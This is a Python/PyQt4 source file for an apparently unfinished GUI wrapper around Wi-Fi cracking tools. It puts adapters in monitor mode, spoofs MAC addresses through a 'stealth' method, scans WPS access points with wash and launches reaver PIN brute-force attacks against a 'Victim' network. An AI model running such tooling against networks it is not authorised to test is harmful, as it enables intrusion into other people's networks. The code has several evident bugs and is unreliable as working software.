#!/usr/bin/env python

import sys
from sys import stdout
import csv
import os
from os import path
import time
import subprocess
from subprocess import Popen, PIPE, call
import multiprocessing
import random
import re
import PyQt4
from PyQt4.QtCore import QFileSystemWatcher
from PyQt4 import QtCore, QtGui, QtSql
from PyQt4.QtGui import QPixmap, QSplashScreen
from signal import SIGINT, SIGTERM
import commands
import wifernGui
import dbase

"""
    My first attempt at duplicating the fern-wifi-cracker and wifite programs
    with a Graphical Interface.
    A tall order and a long rood ahead but if you don't start you're never gone learn

"""

wordlist_path = ''
wordlist = ''
list_processes = []  # maybe list of proccesses to close on exit
int_iface = ''
before_intface = ('', '')
after_intface = ('', '')
mon_iface = ''
adapters = []
monitors = []
ProgList = []
not_rec_list = []



class wifern(QtGui.QMainWindow, wifernGui.Ui_mainwindow):
    'Main application class derived from WIfite and FERN-wifi-cracker thus wifern'

    def __init__(self, parent=None):
        super(wifern, self).__init__(parent)
        self.setupUi(self)
        if os.getuid() != 0:
            exit(1)
        #self.working_Dir = ''
        dbase.working_dir()
        self.recs()
        self.connect(self.access_pointScan_Button, QtCore.SIGNAL("clicked()"), self.wifi_window)
        self.connect(self.dictionary_select_Button, QtCore.SIGNAL("clicked()"), self.opendict)
        self.connect(self.Get_Wordlist_Button, QtCore.SIGNAL("clicked()"), self.Sort_Wordlist)
        self.connect(self.start_wash_Button, QtCore.SIGNAL("clicked()"), self.wash_call)
        self.connect(self.Process_wordlist_Button, QtCore.SIGNAL("clicked()"), self.process_wordlist)
        self.connect(self.list_interfaces_Button, QtCore.SIGNAL("clicked()"), self.wireless_interface)
        self.connect(self.wlan0_monitor_Button, QtCore.SIGNAL('clicked()'), self.monitor_mode_enable)
        self.connect(self.wlan1_monitor_button, QtCore.SIGNAL('clicked()'), self.UseThis)
        self.connect(self.Monitor_select_comboBox, QtCore.SIGNAL('clicked()'), self.washMonitorList)
        self.connect(self.wash_tableView, QtCore.SIGNAL('clicked(QModelIndex)'), self.reaverPrep)
        self.connect(self.startReaver_Button, QtCore.SIGNAL("clicked(bool)"), self.reaverPrep)
        self.connect(self.wordlist_save_button, QtCore.SIGNAL('clicked()'), self.saveWordlist)
        self.connect(self.mac_gen_Button, QtCore.SIGNAL('clicked()'), self.MacGen)
        self.connect(self.Rec_Install_Button, QtCore.SIGNAL('clicked()'), self.recInstall)
        self.wlan0_monitor_Button.setVisible(False)
        self.wlan1_monitor_button.setVisible(False)
        self.start_wash_Button.setEnabled(False)
        self.Monitor_select_comboBox.setEnabled(False)
        self.wordlist_save_button.setEnabled(False)
        self.showlcd()
        self.Process_wordlist_Button.setEnabled(False)
        self.startReaver_Button.setEnabled(False)

    ####################################################
    ####  MAIN WINDOW WIDGETS AND DISPLAY         ######
    ####################################################

    def UseThis(self):  # TODO check for reaver and wash then set buttons active
        if self.monitors_comboBox.currentText() != '':
            self.Monitor_select_comboBox.setEnabled(True)
            self.mon_iface = self.monitors_comboBox.currentText()
            if 'reaver' in ProgList and 'wash' in ProgList:
                self.start_wash_Button.setEnabled(True)

    def washMonitorList(self):
        try:
            for i in self.monitors:
                self.Monitor_select_comboBox.addItem(i)
        except TypeError:
            print 'No Interface'

    def showlcd(self):
        time = QtCore.QTime.currentTime()
        text = time.toString('hh:mm')
        self.lcd_time_Number.display(text)
    #####################################################
    ###  INTERFACE, MONITOR MODE AND INJECTION CHECK ####
    #####################################################
    def wireless_interface(self):
        #######################
        ##   Method Works   ###
        #######################
        global monitors, adapters
        query = QtSql.QSqlQuery(db)
        # need to check if iwconfig exists (it should )
        cmd = str(commands.getoutput('iwconfig'))
        if 'Mode:Managed' in cmd:
            regex = re.compile('wlan\d', re.IGNORECASE)
            adapters = regex.findall(cmd)
        if 'Mode:Monitor' in cmd:
            regex = re.compile('mon\d', re.IGNORECASE)
            monitors = regex.findall(cmd)
        if not (('Mode:Managed') or ('Mode:Monitor')) in cmd:
            text = ['No Interface']
            for i in text:
                self.adapters_comboBox.addItem(i)
        if adapters:
            self.adapters_comboBox.clear()
            for adap in adapters:
                self.adapters_comboBox.addItem(adap)
                self.wlan0_monitor_Button.setVisible(True)
                # int_iface = str(self.adapters_comboBox.currentText())
                comm = str(commands.getoutput("ifconfig " + adap + " | awk '/HWaddr/ {print $1 " " $NF}'"))
                a = comm.splitlines()
                for word in a:
                    wor_essid = word[:-17]
                    wor_mac = word[-17:]
                    query.prepare("insert into adapters (name, bssid, status) values(?,?,?)")
                    query.addBindValue(wor_essid)
                    query.addBindValue(wor_mac)
                    query.addBindValue("before")
                    query.exec_()
                    if wor_essid == int_iface:
                        before_intface = wor_essid, wor_mac
        else:
            return
        if monitors:
            for monit in monitors:
                self.monitors_comboBox.addItem(monit)
                self.wlan1_monitor_button.setVisible(True)
                self.Monitor_select_comboBox.addItem(monit)
                comm = str(commands.getoutput("ifconfig " + monit + " | awk '/HWaddr/ {print $1 " " $NF}'"))
                a = comm.splitlines()
                for word in a:
                    wor_essid = word[:-47]
                    wor_mac = word[-47:-30]
                    wor_mac = wor_mac.replace('-', ':')
                    query.prepare("insert into monitors (name, bssid) values (?,?)")
                    query.addBindValue(wor_essid)
                    query.addBindValue(wor_mac)
                    query.exec_()
                    if wor_essid == monit:
                        b_m_intface = wor_essid, wor_mac

        else:
            return
        print adapters, monitors  # remove after tests

    def monitor_mode_enable(self):
        #########################
        ###  Method Works     ###
        #########################
        query = QtSql.QSqlQuery(db)
        int_iface = str(self.adapters_comboBox.currentText())
        query.prepare("select adapters.bssid from adapters where adapters.name = ? and adapters.status = ?")
        query.addBindValue(int_iface)
        query.addBindValue("before")
        query.exec_()
        query.next()
        try:
            if len(adapters) == len(monitors):
                message = QtGui.QMessageBox.information(self, "Select diferent adapter",
                                                        int_iface + " Has already been put in monitor mode",
                                                        QtGui.QMessageBox.Ok)
                return

            if len(monitors) > len(adapters):
                response = QtGui.QMessageBox.information(self, 'Too many monitors',
                                                         'There are too many monitor interfaces up\n'
                                                         'Would you like to reset them?',
                                                         QtGui.QMessageBox.Yes | QtGui.QMessageBox.No)
                if response == QtGui.QMessageBox.Yes:
                    for i in monitors:
                        call(['airmon-ng', 'stop', i])
                        mon_iface = ''
                        for i in range(self.monitors_comboBox.count()):
                            self.monitors_comboBox.removeItem(i)
                        self.wireless_interface()
                if response == QtGui.QMessageBox.No:
                    return
            if query.isValid():
                Mon_bss = str(query.value(0).toString())
                try:
                    query1 = QtSql.QSqlQuery()
                    query1.prepare("select monitors.name from monitors where monitors.bssid = ?")
                    query1.addBindValue(Mon_bss.upper());
                    query1.exec_()
                    query.next()
                    if query1.isValid():
                        message = QtGui.QMessageBox.information(self, "Select diferent adapter",
                                                                int_iface + " has already been put in monitor mode",
                                                                QtGui.QMessageBox.Ok)
                    else:
                        comm = str(commands.getoutput("ifconfig -a | awk '/HWaddr/ {print $1 " " $NF}'"))
                        a = comm.splitlines()
                        for word in a:
                            wor_essid = word[:-17]
                            wor_mac = word[-17:]
                        if wor_essid == int_iface:
                            before_intface = wor_essid, wor_mac
                            wor_mac_mon = self.stealth(str(wor_essid), str(wor_mac))
                            query.prepare("insert into adapters(name, bssid, status) values(?,?,?)")
                            query.addBindValue(wor_essid)
                            query.addBindValue(wor_mac_mon)
                            query.addBindValue('after')
                            query.exec_()
                        comma = str(commands.getoutput('airmon-ng start %s' % (int_iface)))
                        if 'monitor mode enabled' in comma:
                            reg = re.compile('mon\d', re.IGNORECASE)
                            x_int = reg.findall(comma)
                            for a, monitor in enumerate(x_int):
                                mon_iface = monitor
                                if mon_iface in monitors:
                                    mon_iface = x_int[(a + 1) % len(x_int)]
                                else:
                                    monitors.append(mon_iface)
                            if self.injection_working(mon_iface):  ## Check if injection is working
                                if mon_iface in monitors:
                                    for monit in monitors:
                                        self.monitors_comboBox.addItem(monit)
                                        self.Monitor_select_comboBox.addItem(monit)
                                        self.wlan1_monitor_button.setVisible(True)
                                else:
                                    monitors.append(mon_iface)
                                    for monit in monitors:
                                        self.monitors_comboBox.addItem(monit)
                                        self.Monitor_select_comboBox.addItem(monit)
                                        self.wlan1_monitor_button.setVisible(True)
                            else:
                                print('Injection NOT working')
                except OSError as e:
                    print e.message
                except QtSql.QSqlError as qt:  ## Add instuctions to fix or buy other card
                    print qt.text()  ## Disable(!!!!!) buttons

        except QtSql.QSqlError as qt:
            print qt.text()

    def randomMAC(self):  # Produces a random mac address, can be used with both adapters and monitors
        mac = [0x00,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    def stealth(self, alpha, beta):
        # Changes mac address of device(together with randomMac())
        cmd_down = ['ifconfig', alpha, 'down']
        call(cmd_down)
        new_mac = str(self.randomMAC())
        if new_mac == beta:
            new_mac = str(self.randomMAC())
        cmd_change = ['ifconfig', alpha, 'hw', 'ether', new_mac]
        call(cmd_change)
        cmd_up = ['ifconfig', alpha, 'up']
        call(cmd_up)
        return str(new_mac)

    def injection_working(self, mon_iface_check):  #
        cmd = ['aireplay-ng', '-9', mon_iface_check]
        cmd_inj = Popen(cmd, stdout=PIPE)
        for line in iter(cmd_inj.stdout.readline, ''):
            if 'Injection is working!' in line:
                x = int(cmd_inj.pid)
                os.kill(x, SIGINT)
                message = QtGui.QMessageBox.information(self, 'Injection',
                                                        'Injection on ' + mon_iface_check + ' is working!',
                                                        QtGui.QMessageBox.Ok)
                return True

        message = QtGui.QMessageBox.information(self, 'Injection',
                                                "Injection on " + mon_iface_check + " is NOT working!",
                                                QtGui.QMessageBox.Ok)
        return False

    ####################################################
    ###  PREQUISITE PROGRAMS CHECK               #######
    ####################################################

    def program_list(self, program):
        proc = Popen(['which', program], stdout=PIPE, stderr=PIPE)
        txt = proc.communicate()
        if txt[0].strip() == '' and txt[1].strip() == '':
            return False
        if txt[0].strip() != '' and txt[1].strip() == '':
            return True
        return not (txt[1].strip() == '' or txt[1].find('no %s in' % program) != -1)

    def ocd(self, prog):
        query = QtSql.QSqlQuery(db)
        query.prepare("select available from recs where program_name = ?")
        query.addBindValue(prog)
        query.exec_()
        if query.isValid():
            oop = bool(query.value(0).toString())
            if oop:
                return True
            else:
                return False

    def recs(self):
        ####################
        #  Method works    #
        ####################
        try:
            row = 0
            col = 0
            query = QtSql.QSqlQuery()
            self.my_tableWidget.setColumnCount(3)
            self.my_tableWidget.setColumnWidth(1, 70)
            self.my_tableWidget.setColumnWidth(2, 70)
            self.my_tableWidget.setRowCount(20)
            rec_progs = ['aircrack-ng', 'aireplay-ng', 'airodump-ng', 'airmon-ng', 'packetforge-ng',
                         'iw', 'iwconfig', 'reaver', 'wash', 'mdk3', 'pyrit', 'ifconfig', 'sqlite3']
            for prog in rec_progs:
                if self.program_list(prog):
                    ProgList.append(prog)
                    query.prepare("insert into recs (program_name, available) values (?,?)")
                    query.addBindValue(prog)
                    query.addBindValue(True)
                    query.exec_()
                    x = QtGui.QTableWidgetItem()
                    x.setFlags(QtCore.Qt.ItemIsEnabled)
                    x.setCheckState(QtCore.Qt.Checked)
                    y = QtGui.QTableWidgetItem()
                    y.setFlags(QtCore.Qt.ItemIsEnabled)
                    y.setCheckState(QtCore.Qt.Checked)
                    row_item = QtGui.QTableWidgetItem(prog)
                    self.my_tableWidget.setItem(row, col, row_item)
                    self.my_tableWidget.setItem(row, 1, x)
                    self.my_tableWidget.setItem(row, 2, y)
                    row += 1
                else:
                    not_rec_list.append(prog)
                    query.prepare("insert into recs (program_name, available) values (?,?)")
                    query.addBindValue(prog)
                    query.addBindValue(False)
                    query.exec_()
                    x = QtGui.QTableWidgetItem()
                    x.setFlags(QtCore.Qt.ItemIsEnabled)
                    x.setCheckState(QtCore.Qt.Unchecked)
                    y = QtGui.QTableWidgetItem()
                    y.setFlags(QtCore.Qt.ItemIsEnabled)
                    y.setCheckState(QtCore.Qt.Checked)
                    row_item = QtGui.QTableWidgetItem(prog)
                    self.my_tableWidget.setItem(row, col, row_item)
                    self.my_tableWidget.setItem(row, 1, x)
                    self.my_tableWidget.setItem(row, 2, y)
                    row += 1

            not_rec_progs = ['bully', 'crunch', 'pw-inspector', 'oclhashcat']
            for prog in not_rec_progs:
                if self.program_list(prog):
                    ProgList.append(prog)
                    query.prepare("insert into recs(program_name, available) values(?,?)")
                    query.addBindValue(prog)
                    query.addBindValue(True)
                    query.exec_()
                    x = QtGui.QTableWidgetItem()
                    x.setFlags(QtCore.Qt.ItemIsEnabled)
                    x.setCheckState(QtCore.Qt.Checked)
                    y = QtGui.QTableWidgetItem()
                    y.setFlags(QtCore.Qt.ItemIsEnabled)
                    y.setCheckState(QtCore.Qt.Unchecked)
                    row_item = QtGui.QTableWidgetItem(prog)
                    self.my_tableWidget.setItem(row, col, row_item)
                    self.my_tableWidget.setItem(row, 1, x)
                    self.my_tableWidget.setItem(row, 2, y)
                    row += 1
                else:
                    not_rec_list.append(prog)
                    query.prepare("insert into recs(program_name, available) values (?,?)")
                    query.addBindValue(prog)
                    query.addBindValue(False)
                    query.exec_()
                    x = QtGui.QTableWidgetItem()
                    x.setFlags(QtCore.Qt.ItemIsEnabled)
                    x.setCheckState(QtCore.Qt.Unchecked)
                    y = QtGui.QTableWidgetItem()
                    y.setFlags(QtCore.Qt.ItemIsEnabled)
                    y.setCheckState(QtCore.Qt.Unchecked)
                    row_item = QtGui.QTableWidgetItem(prog)
                    self.my_tableWidget.setItem(row, col, row_item)
                    self.my_tableWidget.setItem(row, 1, x)
                    self.my_tableWidget.setItem(row, 2, y)
                    row += 1
            self.my_tableWidget.setRowCount(row)
            if not_rec_list.__len__() == 0:
                self.Rec_Install_Button.setEnabled(False)

        except OSError as e:
            print e.message

    def recInstall(self):
        cmd = ['apt-get',
               'install'
               '-y']
        for program in not_rec_list:
            cmd.append(program)
        f = Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
        self.recs()

    ####################################################
    ###     WORDLIST PROCESS                      ######
    ####################################################


    ####################################################
    ###    WASH TABLE START                       ######
    ####################################################
    def wash_call(self):
        try:
            if 'wash' in ProgList:
                mon = str(self.mon_iface)
                if self.start_wash_Button.text() == 'Start':
                    self.start_wash_Button.setText('Stop')
                    t = multiprocessing.Process(target=self.WashThread, args=(mon,)).start()
                    self.wash_model = QtSql.QSqlQueryModel()
                    self.wash_model.clear()

                    self.wash_model.setQuery("select * from reaver", db)
                    self.wash_model.setHeaderData(0, QtCore.Qt.Horizontal, "BSSID")
                    self.wash_model.setHeaderData(1, QtCore.Qt.Horizontal, "ESSID")
                    self.wash_model.setHeaderData(2, QtCore.Qt.Horizontal, "Channel")
                    self.wash_model.setHeaderData(3, QtCore.Qt.Horizontal, "Power")
                    self.wash_model.setHeaderData(4, QtCore.Qt.Horizontal, "Locked")
                    self.wash_tableView.setModel(self.wash_model)
                    self.wash_tableView.resizeColumnsToContents()
                    self.file_W = QtCore.QFileSystemWatcher()
                    self.file_W.addPath('attack_session.db')
                    self.file_W.fileChanged.connect(self.wash_Refresh)
                    if self.wash_model.lastError().isValid():
                        print self.wash_model.lastError()
                else:
                    self.start_wash_Button.setText('Start')
                    with open('extra.txt', 'r') as f:
                        P_pid = int(f.readline().strip())
                        os.kill(P_pid, SIGINT)
            else:
                message = QtGui.QMessageBox.critical(self, 'Wash not found', 'Can\'t continue, wash not found',
                                                     QtGui.QMessageBox.ok)
        except KeyboardInterrupt, SystemExit:
            os.kill(P_pid, SIGTERM)
        except OSError as e:
            print e.errno  # TODO errors here

        except UnboundLocalError:
            pass

    def wash_Refresh(self):
        self.wash_model.setQuery("select * from reaver", db)
        self.wash_model.setHeaderData(0, QtCore.Qt.Horizontal, "BSSID")
        self.wash_model.setHeaderData(1, QtCore.Qt.Horizontal, "ESSID")
        self.wash_model.setHeaderData(2, QtCore.Qt.Horizontal, "Channel")
        self.wash_model.setHeaderData(3, QtCore.Qt.Horizontal, "Power")
        self.wash_model.setHeaderData(4, QtCore.Qt.Horizontal, "Locked")
        self.wash_tableView.resizeColumnsToContents()

    def WashThread(self, device):
        try:
            if device:
                cmd = ['wash', '-C', '-i', device]
                wash_cmd = Popen(cmd, stdout=PIPE, stderr=PIPE)
                w = str(wash_cmd.pid)
                with open('extra.txt', 'w') as fw:
                    fw.write(w)
                    fw.close()
                while wash_cmd.poll() is None:
                    query = QtSql.QSqlQuery(db)
                    for row in iter(wash_cmd.stdout.readline, b''):
                        if row.strip() == '' or row.startswith('---'): continue
                        if row.startswith('Wash') or row.startswith('Copyright') or row.startswith('BSSID'): continue
                        row = row.strip()
                        Split = row.split()
                        b = str(Split[0])
                        e = str(' '.join(Split[5:]))
                        if len(e) == 0:
                            e = 'Hidden'
                        p = str(Split[2])
                        c = str(Split[1])
                        l = str(Split[4])
                        query.prepare("insert into reaver (bssid, essid, channel, power, locked) values(?,?,?,?,?)")
                        query.addBindValue(b)
                        query.addBindValue(e)
                        query.addBindValue(c)
                        query.addBindValue(p)
                        query.addBindValue(l)
                        query.exec_()

        except Exception as e:
            print e.message

    def reaverPrep(self, index):

        try:
            if not index.isValid():
                return
            self.startReaver_Button.setEnabled(True)
            row = self.wash_tableView.selectedIndexes()
            bssid = row[0].data(QtCore.Qt.DisplayRole).toString()
            essid = row[1].data(QtCore.Qt.DisplayRole).toString()
            channel = row[2].data(QtCore.Qt.DisplayRole).toString()
            locked = row[4].data(QtCore.Qt.DisplayRole).toString()
            self.reaver_command_label.setText('')
            if locked == "Yes":
                self.reaver_ignorelocks.setChecked(True)
            else:
                self.reaver_ignorelocks.setChecked(False)
            print bssid, essid, channel, locked
        except AttributeError:
            if self.startReaver_Button.text() == 'Start Reaver':
                self.startReaver_Button.setText('Stop Reaver')
                row = self.wash_tableView.selectedIndexes()
                bssid = row[0].data(QtCore.Qt.DisplayRole).toString()
                essid = row[1].data(QtCore.Qt.DisplayRole).toString()
                channel = row[2].data(QtCore.Qt.DisplayRole).toString()
                locked = row[4].data(QtCore.Qt.DisplayRole).toString()
                t = multiprocessing.Process(target=self.ReaverRun, args=(bssid, essid, channel, locked)).start()
                with open('stream.out', 'w') as Not:
                    Not.close()
                    self.reaver_Wacher = QtCore.QFileSystemWatcher()
                    self.reaver_Wacher.addPath('stream.out')
                    self.reaver_Wacher.fileChanged.connect(self.reaverLabel)

            else:
                self.startReaver_Button.setText('Start Reaver')
                with open('extra2.txt', 'r') as ff:
                    pid = int(ff.readline())
                    os.kill(pid, SIGINT)
                self.reaver_command_label.setText('AAAAAAAA')
        except KeyboardInterrupt, SystemExit:
            os.kill(pid, SIGTERM)
        except OSError:
            pass

    def ReaverRun(self, bssid, essid, channel, locked):
        try:
            if 'reaver' in ProgList:
                cmd = ['reaver', '-b', bssid, '-c', channel, '-o', self.working_Dir + 'stream.out', '-e', essid, '-a',
                       '-i', self.mon_iface]
                if self.reaver_dhsmall.isChecked():
                    cmd.append('-S')
                if self.reaver_ignorelocks.isChecked():
                    cmd.append('-L')
                if self.reaver_eapterminate.isChecked():
                    cmd.append('-E')
                if self.reaver_nonacks.isChecked():
                    cmd.append('-N')
                if self.reaver_onAssoc.isChecked():
                    t = multiprocessing.Process(target=self.reaverAssoc, args=(bssid, essid, channel,)).start()
                    cmd.append('-A')
                if self.reaverPin_lineEdit.text() != "":
                    cmd.append('-p')
                    cmd.append(str(self.reaverPin_lineEdit.text()))
                print str(cmd)
                run = Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
                revPid = str(run.pid)
                with open('extra2.txt', 'w') as ff:
                    ff.write(str(revPid))
            else:
                message = QtGui.QMessageBox.critical(self, 'Reaver not found', 'Can\'t run command, Reaver not found',
                                                     QtGui.QMessageBox.ok)
        except ValueError:
            message = QtGui.QMessageBox.information(self, 'Pin Incorrect', 'Please enter a correct pin number',
                                                    QtGui.QMessageBox.ok)
            self.reaverPin_lineEdit.setText(" ")

    def reaverLabel(self):
        try:
            with open('stream.out', 'r') as r:
                pline = r.read().split('\n')  # TODO add features later logic, text color, etc
                r.close()  # for now this will do
                for line in pline:
                    if line.strip() == '': continue
                    if line.find('Session saved'): continue
                    if line.find('WARNING'):
                        self.reaver_command_label.setStyleSheet("color: rgb(255, 0, 0);")
                    if line.find('Detected AP'):
                        self.reaver_command_label.setStyleSheet("color: rgb(255, 0, 0);")
                    if line.find('Trying pin'):
                        self.reaver_command_label.setStyleSheet("color: rgb(54, 163, 80);")
                    x = str(line)
                    self.reaver_command_label.setText(x)

        except IOError:
            pass

    def reaverAssoc(self, bssid, essid, channel):
        cmd = ['aireplay-ng', '-1', '100', '-e', essid, '-a', bssid, '--ignore-negative-one', self.mon_iface]
        assoc = Popen(cmd, stdout=PIPE)
        while assoc.poll() is not None:
            ac = ['ps', '-C', 'reaver', '-f']  # FIX ME
            acc = Popen(ac, stdout=PIPE, stderr=PIPE)
            for line in acc.communicate()[0].split('\n'):
                if line.find('reaver'):
                    assoc = Popen(cmd, stdin=PIPE)
                else:
                    assoc.kill()
        else:
            ac = ['ps', '-C', 'reaver', '-f']  # FIX ME
            acc = Popen(ac, stdout=PIPE)
            for line in acc.communicate()[0].split('\n'):
                if not line.find('reaver'):
                    assoc.terminate()

    ####################################################
    ###     WIFI TABLE START                     #######
    ####################################################


    ####################################################
    ##############  MAC GENERATOR   ####################
    ####################################################

    #####################################################
    ###   Closing the Main Window                   #####
    #####################################################

    def closeEvent(self, QCloseEvent):
        query = QtSql.QSqlQuery(db)
        query.prepare("select name from monitors")
        query.exec_()
        while query.next():
            tempList = QtCore.QStringList()
            tempList.append(query.value(0).toString())
            for erase in tempList:
                call(['airmon-ng', 'stop', erase], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
        else:
            if os.path.exists(dbase.working__dir):
                for f in os.listdir(dbase.working__dir):
                    os.remove(dbase.working__dir + f)
            os.rmdir(dbase.working__dir)


class CapFile:
    'Holds data about an access points .cap file, including AP ESSID & BSSID'

    def __init__(self, filename, ssid, bssid):
        self.filename = filename
        self.ssid = ssid
        self.bssid = bssid


class Victim():
    '''Contains information about the Access Point we are about to attack'''

    def __init__(self, bssid, power, channel, encryption, model, essid, wps):
        self.bssid = bssid
        self.power = power
        self.channel = channel
        self.encryption = encryption
        self.essid = essid
        self.model = model
        self.wps = wps
        self.wps = False  # Default to non-WPS-enabled router.
        self.key = ''
        self.hasHandshake = False



class Client():
    'Contains information about the connected clients to the AP'

    def __init__(self, bssid, station, power, essid, encryption):
        self.bssid = bssid
        self.station = station
        self.power = power
        self.essid = essid
        self.encryption = encryption
        self.probes = []


if __name__ == "__main__":
    app = QtGui.QApplication(sys.argv)
    # splash_pix = QPixmap('Resources/wifern.png')
    # splash = QSplashScreen(splash_pix, QtCore.Qt.WindowStaysOnTopHint)
    # splash.setMask(splash_pix.mask())
    # splash.show()
    # app.processEvents()
    multiprocessing.freeze_support()
    form = wifern()
    form.show()
    sys.exit(app.exec_())
